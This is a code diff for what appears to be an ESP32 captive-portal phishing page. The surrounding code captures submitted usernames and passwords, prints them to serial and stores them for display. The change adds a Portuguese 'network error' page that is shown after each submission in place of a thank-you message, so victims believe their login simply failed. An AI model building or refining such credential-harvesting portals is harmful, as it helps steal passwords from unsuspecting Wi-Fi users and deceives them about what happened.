@@ -16,11 +16,82 @@ WebServer server(80);
 String users[10]; // Capacidade para até 10 usuários
 int userIndex = 0; // Índice para o próximo login a ser armazenado
 
+const char* erroPage = R"rawliteral(
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Erro de Rede</title>
+    <style>
+        /* Estilo para a tela inteira */
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f1f1f1;
+            font-family: Arial, sans-serif;
+        }
+
+        /* Container para a mensagem de erro */
+        .error-container {
+            text-align: center;
+            background-color: #ff4d4d;
+            color: #fff;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            max-width: 500px;
+            width: 100%;
+        }
+
+        /* Estilo para o título */
+        h1 {
+            font-size: 30px;
+            margin-bottom: 20px;
+        }
+
+        /* Estilo para a mensagem */
+        p {
+            font-size: 18px;
+            margin-top: 0;
+        }
+
+        /* Estilo para o botão */
+        .retry-button {
+            margin-top: 20px;
+            padding: 10px 20px;
+            font-size: 16px;
+            background-color: #ff6666;
+            border: none;
+            border-radius: 5px;
+            color: #fff;
+            cursor: pointer;
+        }
+
+        .retry-button:hover {
+            background-color: #ff3333;
+        }
+    </style>
+</head>
+<body>
+    <div class="error-container">
+        <h1>Erro na Rede</h1>
+        <p>Ocorreu um erro ao tentar conectar-se à rede.</p>
+        <button class="retry-button" onclick="window.location.reload();">Tentar Novamente</button>
+    </div>
+</body>
+</html>
+)rawliteral";
+
 
 // Página HTML simples
 const char* loginPage = R"rawliteral(
 <!DOCTYPE html>
-<html lang="en">
+<html lang="pt-br">
 <head>
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -209,7 +280,7 @@ void handleSubmit() {
     Serial.println("Senha: " + password);
   }
 
-  server.send(200, "text/html", "<h1>Obrigado por testar!</h1>");
+  server.send(200, "text/html", erroPage);
 }
 
 // Exibir os logins armazenados
